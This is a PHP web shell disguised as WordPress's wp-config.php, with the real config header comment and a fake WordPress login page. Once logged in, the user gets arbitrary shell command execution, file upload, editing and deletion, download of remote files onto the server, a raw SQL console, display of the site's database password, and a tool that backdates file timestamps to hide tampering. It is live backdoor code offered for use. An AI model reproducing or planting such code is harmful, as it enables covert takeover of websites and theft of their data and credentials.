<?php
/**
 * The base configuration for WordPress
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

session_start();
@ini_set('upload_max_filesize', '500M');
@ini_set('post_max_size', '500M');
@ini_set('max_file_uploads', '200');

// --- KONFIGURASI ---
$pass = '$2y$10$kmXQVh3umv/w.vGurDcJsOVHPGre1OxhscpeqHZP0H8540r3HUC8q'; 
$ip_lock = ""; 
// -------------------

$sql_result = "";
if (isset($_POST['run_sql'])) {
    $h = $_POST['db_host'];
    $u = $_POST['db_user'];
    $p = $_POST['db_pass'];
    $n = $_POST['db_name'];
    $q = $_POST['db_query'];
    
    $conn = @new mysqli($h, $u, $p, $n);
    if ($conn->connect_error) {
        $sql_result = "<div style='color:red; padding:10px;'>❌ Koneksi Gagal: " . $conn->connect_error . "</div>";
    } else {
        $res = $conn->query($q);
        if ($res === TRUE) {
            $sql_result = "<div style='color:#2ecc71; padding:10px;'>✅ Query Berhasil dieksekusi!</div>";
        } elseif ($res && $res->num_rows > 0) {
            $sql_result .= "<div style='overflow-x:auto; margin-top:10px;'><table style='font-size:11px;'><thead><tr style='background:#2271b1; color:#fff;'>";
            $fields = $res->fetch_fields();
            foreach ($fields as $field) { $sql_result .= "<th>{$field->name}</th>"; }
            $sql_result .= "</tr></thead><tbody>";
            while ($row = $res->fetch_assoc()) {
                $sql_result .= "<tr>";
                foreach ($row as $val) { $sql_result .= "<td>" . htmlspecialchars(substr($val, 0, 100)) . "</td>"; }
                $sql_result .= "</tr>";
            }
            $sql_result .= "</tbody></table></div>";
            $sql_result .= "<div style='padding:5px; color:#aaa; font-size:10px;'>Total: " . $res->num_rows . " rows.</div>";
        } else {
            $sql_result = "<div style='color:orange; padding:10px;'>⚠️ Query OK, tapi tidak ada hasil (0 rows) atau Error: " . $conn->error . "</div>";
        }
        $conn->close();
    }
}

if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
if (!empty($ip_lock) && $_SERVER['REMOTE_ADDR'] !== $ip_lock) die("⛔ ACCESS DENIED");

$error_msg = "";
if (isset($_POST['p'])) {
    if (password_verify($_POST['p'], $pass)) { 
        $_SESSION['ex_login'] = true; 
    } else { 
        $error_msg = "Password salah."; 
    }
}


if (isset($_POST['upload_url'])) {
    $url = $_POST['url_link'];
    $dest = $dir . '/' . basename($url);
   
    if(ini_get('allow_url_fopen')) {
        if (@copy($url, $dest)) {
            $msg = "✅ File berhasil ditarik: " . basename($url);
        } else {
            
            $ch = curl_init($url);
            $fp = fopen($dest, 'wb');
            curl_setopt($ch, CURLOPT_FILE, $fp);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_exec($ch);
            curl_close($ch);
            fclose($fp);
            if(file_exists($dest) && filesize($dest) > 0) $msg = "✅ File ditarik via CURL!";
            else $msg = "❌ Gagal narik file (Firewall/CURL Error).";
        }
    } else {
        $msg = "❌ Server melarang 'allow_url_fopen'.";
    }
}


if (isset($_POST['touch_item'])) {
    $t_file = $dir . '/' . $_POST['touch_file'];
    $t_time = strtotime($_POST['touch_date']);
    if (@touch($t_file, $t_time)) {
        $msg = "✅ Tanggal file berhasil dimundurkan!";
    } else {
        $msg = "❌ Gagal ubah tanggal (Permission Denied).";
    }
}


if (!isset($_SESSION['ex_login'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In &lsaquo; Administration Panel</title>
    <style>
        
        body { background: #f0f0f1; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; margin: 0; color: #3c434a; }
        
        .login-logo { margin-bottom: 25px; text-align: center; }
        .login-logo svg { width: 84px; height: 84px; fill: #555; }
        
        .login-card { background: #fff; border: 1px solid #c3c4c7; padding: 24px; width: 100%; max-width: 320px; box-shadow: 0 1px 3px rgba(0,0,0,.04); }
        
        label { display: block; margin-bottom: 5px; font-size: 14px; font-weight: 600; }
        
        input[type="password"] {
            font-size: 24px; line-height: 1.33333333; width: 100%; border-width: 1px; border-style: solid; border-color: #8c8f94; border-radius: 4px; box-sizing: border-box; padding: 0 8px; margin-bottom: 20px; height: 40px; transition: .2s;
        }
        input[type="password"]:focus { border-color: #2271b1; box-shadow: 0 0 0 1px #2271b1; outline: 2px solid transparent; }
        
        button {
            background: #2271b1; border-color: #2271b1; color: #fff; text-decoration: none; text-shadow: none; display: inline-block; font-size: 13px; line-height: 2.15384615; min-height: 30px; margin: 0; padding: 0 10px; cursor: pointer; border-width: 1px; border-style: solid; -webkit-appearance: none; border-radius: 3px; white-space: nowrap; box-sizing: border-box; width: 100%; font-weight: 600;
        }
        button:hover { background: #135e96; border-color: #135e96; color: #fff; }
        
        .error { border-left: 4px solid #d63638; background-color: #fff; box-shadow: 0 1px 1px 0 rgba(0,0,0,.1); padding: 12px; margin-bottom: 20px; max-width: 320px; width: 100%; box-sizing: border-box; font-size: 13px; }
        
        .nav { margin-top: 24px; padding: 0; font-size: 13px; text-align: center; }
        .nav a { color: #555; text-decoration: none; }
        .nav a:hover { color: #2271b1; }
    </style>
</head>
<body>
    <div class="login-logo">
        <div class="login-logo">
    <div class="login-logo">
    <a href="https://wordpress.org/">
        <img src="https://s.w.org/style/images/about/WordPress-logotype-wmark.png" 
             alt="WordPress Logo" 
             style="width: 84px; height: 84px; opacity: 0.7;">
    </a>
</div>

    <?php if($error_msg) echo "<div class='error'>$error_msg</div>"; ?>

    <div class="login-card">
        <form method="post">
            <label>Password</label>
            <input type="password" name="p" required autofocus>
            <button type="submit">Log In</button>
        </form>
    </div>

    <p class="nav">
        <a href="#">&larr; Go to <?php echo $_SERVER['HTTP_HOST']; ?></a>
    </p>
</body>
</html>
<?php exit; }

// ==========================================================
// configuration (WordPress PRO)
// ==========================================================

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = str_replace('\\', '/', $dir);
if (!is_dir($dir)) $dir = getcwd();

$msg = "";
$cmd_result = "";

if (isset($_POST['cmd_input'])) {
    if (function_exists('shell_exec')) {
        $cmd_result = shell_exec($_POST['cmd_input'] . " 2>&1");
        if (empty($cmd_result)) $cmd_result = "Empty output / Function disabled.";
    } else {
        $cmd_result = "❌ shell_exec disabled by server.";
    }
}

if (isset($_POST['chmod_act'])) {
    if (chmod($dir . '/' . $_POST['c_name'], octdec($_POST['c_mode']))) $msg = "✅ Permission changed to " . $_POST['c_mode'];
    else $msg = "❌ Failed to change permission.";
}

if (isset($_POST['upload_single'])) { if(move_uploaded_file($_FILES['f']['tmp_name'], $dir.'/'.$_FILES['f']['name'])) $msg="✅ File Uploaded!"; }
if (isset($_FILES['folder_files'])) {
    header('Content-Type: application/json'); $count = count($_FILES['folder_files']['name']); $success = 0; $paths = $_POST['folder_paths'];
    for ($i = 0; $i < $count; $i++) {
        $target = $dir . '/' . $paths[$i]; $targetDir = dirname($target);
        if (!is_dir($targetDir)) mkdir($targetDir, 0755, true);
        if (move_uploaded_file($_FILES['folder_files']['tmp_name'][$i], $target)) $success++;
    } echo json_encode(['status' => 'done', 'msg' => "$success items uploaded."]); exit;
}

if (isset($_POST['mk'])) { @mkdir($dir.'/'.$_POST['dirname']); }
if (isset($_POST['mkfile'])) {
    $t = $dir . '/' . $_POST['filename'];
    if (!file_exists($t)) { if (file_put_contents($t, "") !== false) $msg = "✅ File Created!"; else $msg = "❌ Fail (Permission?)"; } 
    else $msg = "⚠️ File Exists!";
}

// ==========================================
// HANDLER: RENAME, DELETE, EDIT, UNZIP, ZIP
// ==========================================

if (isset($_GET['zip'])) {
    $target = $_GET['zip'];
    $zipName = $target . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), RecursiveIteratorIterator::LEAVES_ONLY);
        foreach ($files as $name => $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen(realpath($target)) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        $msg = "✅ Folder berhasil di-ZIP: " . basename($zipName);
    } else {
        $msg = "❌ Gagal membuat ZIP (Cek Permission).";
    }
}

if (isset($_POST['rename_item'])) { 
    $o = $dir.'/'.$_POST['oldname']; 
    $n = $dir.'/'.$_POST['newname']; 
    if(file_exists($o)) rename($o, $n); 
}
if (isset($_GET['del'])) { 
    $t = $_GET['del']; 
    function delTree($d) { 
        $f=array_diff(scandir($d),['.','..']); 
        foreach($f as $i) (is_dir("$d/$i"))?delTree("$d/$i"):unlink("$d/$i"); 
        return rmdir($d); 
    } 
    (is_dir($t)) ? delTree($t) : unlink($t); 
    header("Location: ?dir=".urlencode($dir)); 
    exit; 
}
if (isset($_GET['dl'])) { 
    $f=$_GET['dl']; 
    if(file_exists($f)){
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        readfile($f);
        exit;
    } 
}
if (isset($_POST['save_edit'])) { 
    file_put_contents($_POST['file_path'], $_POST['content']); 
    $msg="✅ Saved!"; 
}
if (isset($_GET['unzip'])) { 
    $z=new ZipArchive; 
    if($z->open($_GET['unzip'])===TRUE){
        $z->extractTo($dir);
        $z->close();
        $msg="✅ Unzip OK!";
    } 
}

if (isset($_POST['rescue_chmod'])) {
    $r_file = $dir . '/' . $_POST['rescue_path'];
    $r_mode = $_POST['rescue_val'];
    // Konversi string octal ke decimal
    if (@chmod($r_file, octdec($r_mode))) {
        $msg = "✅ RESCUE SUKSES! Folder $r_file kembali normal ($r_mode).";
    } else {
        $msg = "❌ Gagal Rescue. Cek owner file!";
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard &lsaquo; Administration</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'JetBrains Mono', monospace; background: #f4f6f8; padding: 20px; font-size: 13px; color: #333; }
        .box { background: #fff; max-width: 1200px; margin: auto; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
        a { text-decoration: none; color: #2271b1; }
        .btn { padding: 4px 8px; color: #fff; border-radius: 4px; border:none; cursor:pointer; font-size: 11px; margin-right: 2px; display:inline-block; }
        .red { background: #d63638; } .green { background: #00a32a; } .blue { background: #2271b1; } .dark { background: #1d2327; } .org { background: #dba617; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { padding: 8px; border-bottom: 1px solid #eee; text-align: left; }
        tr:hover { background: #f9f9f9; }
        .tools { display: flex; flex-wrap: wrap; gap: 15px; background: #eef; padding: 15px; border-radius: 5px; margin-bottom: 15px; align-items: flex-end;}
        .server-info { font-size:11px; color:#666; margin-bottom:15px; border-bottom:1px solid #ddd; padding-bottom:5px; }
        #progress-wrp { border: 1px solid #2271b1; padding: 1px; position: relative; height: 30px; border-radius: 3px; margin: 10px 0; text-align: left; background: #fff; display: none; }
        #progress-bar { height: 100%; border-radius: 3px; background-color: #2271b1; width: 0; }
        #status-txt { top: 3px; left: 50%; position: absolute; display: inline-block; color: #000; transform: translateX(-50%); font-weight: bold;}
    </style>
</head>
<body>

<div class="box">
    <div style="display:flex;justify-content:space-between;align-items:center;">
        <h3>📁 WordPress <span style="color:#2271b1">ADMIN</span></h3>
        <a href="?logout=1" class="btn dark">Log Out</a>
    </div>

    <div style="background:#1d2327; color:#ccc; font-size:12px; padding:15px; border-radius:5px; margin-bottom:20px; border:1px solid #333; line-height:1.8;">
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
            <div>
                <b style="color:#fff;">🖥️ System:</b> <?php echo php_uname(); ?><br>
                <b style="color:#fff;">👤 User:</b> <?php echo get_current_user(); ?> (UID: <?php echo getmyuid(); ?>)<br>
                <b style="color:#fff;">📦 Software:</b> <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
            </div>
            <div>
                <b style="color:#fff;">🌐 Server IP:</b> <span style="color:#00c6ff"><?php echo $_SERVER['SERVER_ADDR']; ?></span><br>
                <b style="color:#fff;">🕵️ Your IP:</b> <span style="color:#e67e22"><?php echo $_SERVER['REMOTE_ADDR']; ?></span><br>
                <b style="color:#fff;">🐘 PHP Ver:</b> <?php echo phpversion(); ?> 
                (Safe Mode: <?php echo (ini_get('safe_mode') ? '<span style="color:red">ON</span>' : '<span style="color:#2ecc71">OFF</span>'); ?>)
            </div>
        </div>
        
        <?php
        $conf_file = $dir . '/wp-config.php';
        if (file_exists($conf_file)) {
            $conf_data = file_get_contents($conf_file);
            preg_match("/DB_NAME', '(.*?)'/", $conf_data, $db_name);
            preg_match("/DB_USER', '(.*?)'/", $conf_data, $db_user);
            preg_match("/DB_PASSWORD', '(.*?)'/", $conf_data, $db_pass);
            preg_match("/DB_HOST', '(.*?)'/", $conf_data, $db_host);
            
            echo "<div style='margin-top:10px; padding:10px; background:#2c3338; border-left:3px solid #f1c40f;'>
                <b style='color:#f1c40f;'>⚡ WP CONFIG DETECTED!</b><br>
                Name: <span style='color:#fff'>".($db_name[1]??'?')."</span> | 
                User: <span style='color:#fff'>".($db_user[1]??'?')."</span> | 
                Pass: <span style='background:#b32d2e; color:#fff; padding:0 4px;'>".($db_pass[1]??'?')."</span> | 
                Host: ".($db_host[1]??'?')."
            </div>";
        }
        ?>
        <div style="margin-top:10px; border-top:1px solid #444; padding-top:10px;">
            <b style="color:#e74c3c;">🚫 Disabled:</b> 
            <?php 
                $dis = ini_get('disable_functions'); 
                echo $dis ? "<span style='color:#e74c3c'>".str_replace(',', ', ', $dis)."</span>" : "<span style='color:#2ecc71'>NONE</span>"; 
            ?>
        </div>
    </div>

    <details style="background:#1d2327; border:1px solid #333; border-radius:5px; margin-bottom:20px; color:#ccc;">
        <summary style="padding:10px; cursor:pointer; font-weight:bold; outline:none;">🔌 SQL COMMANDER (Database Tool)</summary>
        <div style="padding:15px; border-top:1px solid #333;">
            <form method="post">
                <div style="display:grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap:10px; margin-bottom:10px;">
                    <input type="text" name="db_host" placeholder="localhost" value="localhost" style="padding:5px; background:#000; color:#fff; border:1px solid #444;">
                    <input type="text" name="db_user" placeholder="User" style="padding:5px; background:#000; color:#fff; border:1px solid #444;">
                    <input type="text" name="db_pass" placeholder="Pass" style="padding:5px; background:#000; color:#fff; border:1px solid #444;">
                    <input type="text" name="db_name" placeholder="DB Name" style="padding:5px; background:#000; color:#fff; border:1px solid #444;">
                </div>
                <textarea name="db_query" placeholder="SELECT * FROM wp_users" style="width:100%; height:80px; background:#000; color:#0f0; border:1px solid #444; font-family:monospace; padding:10px;"></textarea>
                <button name="run_sql" class="btn blue" style="width:100%; margin-top:5px; padding:8px;">⚡ EKSEKUSI SQL</button>
            </form>
            
            <?php if ($sql_result) echo $sql_result; ?>
        </div>
    </details>

    <?php if($msg) echo "<div style='padding:10px;background:#d4edda;color:#155724;margin-bottom:10px;'>$msg</div>"; ?>

    <div style="background:#0c0d0e; color:#0f0; padding:10px; border-radius:5px; margin-bottom:15px; font-family:'Courier New', monospace;">
        <form method="post">
            <span style="color:#ff00ea">root@wp-server:~$</span> 
            <input type="text" name="cmd_input" style="background:transparent; border:none; color:#fff; width:70%; outline:none;" placeholder="ls -la, whoami..." autofocus>
        </form>
        <?php if ($cmd_result): ?>
            <pre style="margin-top:10px; color:#ccc; white-space: pre-wrap;"><?php echo htmlspecialchars($cmd_result); ?></pre>
        <?php endif; ?>
    </div>

    <div style="background:#1d2327; color:#fff; padding:10px; border-radius:5px; margin-bottom:10px; word-break:break-all;">
        📂 <b><?php echo $dir; ?></b> <br>
        <a href="?dir=<?php echo urlencode(dirname($dir)); ?>" style="color:#aaa;">[⬆️ Up]</a> 
        <a href="?dir=<?php echo urlencode($_SERVER['DOCUMENT_ROOT']); ?>" style="color:#aaa;">[🏠 Home]</a>
    </div>

    <div class="tools">
        <div style="border-left:1px solid #ccc; padding-left:10px;">
            <b style="color:red">🚑 Rescue:</b>
            <form method="post" style="margin-top:2px;">
                <input type="text" name="rescue_path" placeholder="Nama Folder" style="width:100px;">
                <input type="text" name="rescue_val" value="0755" style="width:50px; text-align:center;">
                <button name="rescue_chmod" class="btn red">Fix</button>
            </form>
        </div>
        <div style="border-left:1px solid #ccc; padding-left:10px;">
            <small>Remote URL:</small><br>
            <form method="post">
                <input type="text" name="url_link" placeholder="http://website.com/file.zip" style="width:150px; padding:3px;">
                <button name="upload_url" class="btn blue">Up</button>
            </form>
        </div>
        <form method="post" enctype="multipart/form-data">
            <small>Upload File:</small><br><input type="file" name="f"><button name="upload_single" class="btn blue">Up</button>
        </form>
        <div style="border-left:1px solid #ccc; padding-left:10px;">
            <small>Upload Folder:</small><br><input type="file" id="folderInput" webkitdirectory directory multiple><button onclick="uploadFolder()" class="btn green">Up Folder</button>
        </div>
        <div style="border-left:1px solid #ccc; padding-left:10px;">
            <small>New Folder:</small><br>
            <form method="post"><input type="text" name="dirname" placeholder="Nama..." size="10"><button name="mk" class="btn dark">Buat</button></form>
        </div>
        <div style="border-left:1px solid #ccc; padding-left:10px;">
            <small>New File:</small><br>
            <form method="post"><input type="text" name="filename" placeholder="file.txt" size="10"><button name="mkfile" class="btn org">Buat</button></form>
        </div>
    </div>

    <div id="progress-wrp"><div id="progress-bar"></div><div id="status-txt">0%</div></div><div id="upload-result"></div>

    <form method="post" id="ren_form" style="display:none;"><input type="hidden" name="rename_item" value="1"><input type="hidden" name="oldname" id="ren_old"><input type="hidden" name="newname" id="ren_new"></form>
    <form method="post" id="chmod_form" style="display:none;"><input type="hidden" name="chmod_act" value="1"><input type="hidden" name="c_name" id="c_name"><input type="hidden" name="c_mode" id="c_mode"></form>

    <?php if (!isset($_GET['edit'])): ?>
    <table>
        <thead><tr style="background:#eee;"><th>Name</th><th width="10%">Size</th><th width="10%">Perms</th><th width="25%">Action</th></tr></thead>
        <tbody>
        <?php
        $scandir = scandir($dir);
        foreach ($scandir as $file) {
            if ($file=='.'||$file=='..') continue;
            $path = $dir.'/'.$file; $is_dir = is_dir($path);
            $perms = substr(sprintf('%o', fileperms($path)), -4);
            $p_color = ($perms=='0777')?'red':'#333';
            
          
            $date_now = date("Y-m-d H:i:s", filemtime($path));
            
            echo "<tr>
                <td>".($is_dir ? "📁 <a href='?dir=".urlencode($path)."'><b>$file</b></a>" : "📄 <a href='?edit=".urlencode($path)."'>$file</a>")."</td>
                <td>".($is_dir?'-':round(filesize($path)/1024,1).' KB')."</td>
                <td><a href='#' onclick=\"chmodBox('$file', '$perms')\" style='color:$p_color;font-weight:bold;'>$perms</a></td>
                <td>
                    <button onclick=\"renameBox('$file')\" class='btn org'>R</button> 
                    
                    <button onclick=\"touchBox('$file', '$date_now')\" class='btn dark'>T</button> ";
                    
                    
                    if($is_dir) {
                        echo "<a href='?dir=".urlencode($dir)."&zip=".urlencode($path)."' class='btn green'>📦 Zip</a> ";
                    }

                    if(!$is_dir) {
                        echo "<a href='?edit=".urlencode($path)."' class='btn blue'>✏️</a> ";
                        echo "<a href='?dl=".urlencode($path)."' class='btn dark'>⬇️</a> ";
                        if(strtolower(pathinfo($file, PATHINFO_EXTENSION))=='zip') echo "<a href='?dir=".urlencode($dir)."&unzip=".urlencode($path)."' class='btn green'>📦</a> ";
                    }
                    echo "<a href='?dir=".urlencode($dir)."&del=".urlencode($path)."' class='btn red' onclick=\"return confirm('Del?')\">🗑</a>
                </td></tr>";
        }
        ?>
        </tbody>
    </table>
    <?php else: ?>
        <h3>✏️ Edit: <?php echo basename($_GET['edit']); ?></h3>
        <form method="post">
            <input type="hidden" name="file_path" value="<?php echo $_GET['edit']; ?>">
            <textarea name="content" style="width:100%;height:400px;background:#222;color:#fff;font-family:monospace;"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea><br>
            <button name="save_edit" class="btn green" style="margin-top:10px;">Simpan Perubahan</button>
            <a href="?dir=<?php echo urlencode($dir); ?>" class="btn red">Batal</a>
        </form>
    <?php endif; ?>
</div>

<script>
function renameBox(o) { let n = prompt("Rename:", o); if (n && n != o) { document.getElementById('ren_old').value = o; document.getElementById('ren_new').value = n; document.getElementById('ren_form').submit(); } }
function chmodBox(f, p) { let n = prompt("Permission (0755/0644/0777):", p); if (n && n != p) { document.getElementById('c_name').value = f; document.getElementById('c_mode').value = n; document.getElementById('chmod_form').submit(); } }
async function uploadFolder() {
    let files = document.getElementById('folderInput').files; if(files.length === 0) { alert("Pilih folder!"); return; }
    let fd = new FormData(); for (let i = 0; i < files.length; i++) { fd.append('folder_files[]', files[i]); fd.append('folder_paths[]', files[i].webkitRelativePath); }
    document.getElementById('progress-wrp').style.display='block'; document.getElementById('upload-result').innerHTML="⏳ Uploading...";
    try { let r = await fetch('?dir=<?php echo urlencode($dir); ?>', {method:'POST', body:fd}); let j = await r.json(); if(j.status==='done') { location.reload(); } } catch(e) { alert("Error upload"); }
}
</script>
<form method="post" id="touch_form" style="display:none;">
    <input type="hidden" name="touch_item" value="1">
    <input type="hidden" name="touch_file" id="touch_file">
    <input type="hidden" name="touch_date" id="touch_date">
</form>

<script>

function touchBox(file, currentProps) { 
    let newDate = prompt("Ubah Tanggal (Format: YYYY-MM-DD HH:MM:SS)", currentProps); 
    if (newDate && newDate != currentProps) { 
        document.getElementById('touch_file').value = file; 
        document.getElementById('touch_date').value = newDate; 
        document.getElementById('touch_form').submit(); 
    } 
}

</script>
<style>
    /* Modal Background */
    .modal-overlay { display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(2px); animation: fadeIn 0.3s; }
    /* Modal Box */
    .modal-box { background: #1f2937; margin: 10% auto; padding: 25px; border-radius: 8px; width: 350px; color: #fff; font-family: sans-serif; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #374151; }
    .modal-header { font-size: 18px; font-weight: bold; margin-bottom: 20px; border-bottom: 1px solid #374151; padding-bottom: 10px; text-align: center; }
    /* Grid Checkbox */
    .perm-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; margin-bottom: 20px; text-align: center; font-size: 13px; }
    .perm-label { font-weight: bold; color: #9ca3af; margin-bottom: 5px; }
    /* Checkbox Custom */
    input[type=checkbox] { transform: scale(1.2); accent-color: #2271b1; cursor: pointer; }
    /* Buttons */
    .modal-actions { display: flex; justify-content: space-between; gap: 10px; }
    .btn-modal { padding: 8px 16px; border-radius: 4px; cursor: pointer; border: none; font-weight: bold; width: 100%; }
    .btn-cancel { background: transparent; border: 1px solid #ef4444; color: #ef4444; }
    .btn-cancel:hover { background: #ef4444; color: white; }
    .btn-save { background: #10b981; color: white; }
    .btn-save:hover { background: #059669; }
    @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
</style>

<div style="text-align:center; margin-top:20px; font-family:monospace; padding-bottom:20px;">
    <div style="color:#ff0055; font-weight:bold;">
        [ Cora`jr &copy; 2023-<?php echo date('Y'); ?> ]
    </div>

<div id="permModal" class="modal-overlay">
    <div class="modal-box">
        <div style="margin-bottom:15px; font-weight:bold; font-size:16px;">CHMOD Manager</div>
        
        <div class="perm-grid" style="display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin-bottom:20px; text-align:center;">
            <div></div> <div style="color:#aaa">Own</div> <div style="color:#aaa">Grp</div> <div style="color:#aaa">Oth</div>
            
            <div style="text-align:left">Read</div>
            <input type="checkbox" id="u_r"><input type="checkbox" id="g_r"><input type="checkbox" id="o_r">
            
            <div style="text-align:left">Write</div>
            <input type="checkbox" id="u_w"><input type="checkbox" id="g_w"><input type="checkbox" id="o_w">
            
            <div style="text-align:left">Exec</div>
            <input type="checkbox" id="u_x"><input type="checkbox" id="g_x"><input type="checkbox" id="o_x">
        </div>

        <div style="margin-bottom:20px; border-top:1px solid #444; padding-top:15px;">
            <label>Permission Value:</label><br>
            <input type="text" id="perm-text" maxlength="4" style="width:100px; text-align:center; font-size:18px; font-weight:bold; background:#000; color:#0f0; border:1px solid #555; padding:5px; margin-top:5px;" onkeyup="updateCheckboxes()">
        </div>

        <button onclick="document.getElementById('permModal').style.display='none'" class="btn red">Cancel</button> 
        <button onclick="savePerms()" class="btn green">Save</button>
    </div>
</div>

<form method="post" id="hidden_forms" style="display:none;">
    <input type="hidden" name="rename_item" value="1"><input type="hidden" name="oldname" id="ren_old"><input type="hidden" name="newname" id="ren_new">
    <input type="hidden" name="chmod_act" value="1"><input type="hidden" name="c_name" id="c_name"><input type="hidden" name="c_mode" id="c_mode_input">
    <input type="hidden" name="touch_item" value="1"><input type="hidden" name="touch_file" id="touch_file"><input type="hidden" name="touch_date" id="touch_date">
</form>

<script>
function renameBox(o) { let n = prompt("Rename:", o); if (n && n != o) { document.getElementById('ren_old').value = o; document.getElementById('ren_new').value = n; document.getElementById('hidden_forms').submit(); } }
function touchBox(f, d) { let n = prompt("Time (YYYY-MM-DD HH:MM:SS):", d); if (n && n != d) { document.getElementById('touch_file').value = f; document.getElementById('touch_date').value = n; document.getElementById('hidden_forms').submit(); } }

function chmodBox(f, p) { 
    document.getElementById('c_name').value = f;
    
    let len = p.length;
    let u = parseInt(p.charAt(len - 3)); 
    let g = parseInt(p.charAt(len - 2)); 
    let o = parseInt(p.charAt(len - 1)); 

    // Isi Checkbox Owner
    document.getElementById('u_r').checked = (u & 4); 
    document.getElementById('u_w').checked = (u & 2); 
    document.getElementById('u_x').checked = (u & 1);
    
    // Isi Checkbox Group
    document.getElementById('g_r').checked = (g & 4); 
    document.getElementById('g_w').checked = (g & 2); 
    document.getElementById('g_x').checked = (g & 1);
    
    // Isi Checkbox Other
    document.getElementById('o_r').checked = (o & 4); 
    document.getElementById('o_w').checked = (o & 2); 
    document.getElementById('o_x').checked = (o & 1);
    
    // Isi Textbox Angka
    calcPerms(); 
    document.getElementById('permModal').style.display='block'; 
}

function calcPerms() {
    let u = (document.getElementById('u_r').checked?4:0) + (document.getElementById('u_w').checked?2:0) + (document.getElementById('u_x').checked?1:0);
    let g = (document.getElementById('g_r').checked?4:0) + (document.getElementById('g_w').checked?2:0) + (document.getElementById('g_x').checked?1:0);
    let o = (document.getElementById('o_r').checked?4:0) + (document.getElementById('o_w').checked?2:0) + (document.getElementById('o_x').checked?1:0);
    document.getElementById('perm-text').value = '0' + u + g + o;
}

function updateCheckboxes() {
    let val = document.getElementById('perm-text').value;
    if (val.length >= 3) {
        let u = parseInt(val.charAt(val.length - 3));
        let g = parseInt(val.charAt(val.length - 2));
        let o = parseInt(val.charAt(val.length - 1));
        
        if(!isNaN(u)) { document.getElementById('u_r').checked=(u&4); document.getElementById('u_w').checked=(u&2); document.getElementById('u_x').checked=(u&1); }
        if(!isNaN(g)) { document.getElementById('g_r').checked=(g&4); document.getElementById('g_w').checked=(g&2); document.getElementById('g_x').checked=(g&1); }
        if(!isNaN(o)) { document.getElementById('o_r').checked=(o&4); document.getElementById('o_w').checked=(o&2); document.getElementById('o_x').checked=(o&1); }
    }
}

// Event Listener
document.querySelectorAll('#permModal input[type=checkbox]').forEach(cb => { cb.addEventListener('change', calcPerms); });

// Save Function
function savePerms() { 
    document.getElementById('c_mode_input').value = document.getElementById('perm-text').value; 
    document.getElementById('hidden_forms').submit(); 
}
</script>
</body>
</html>
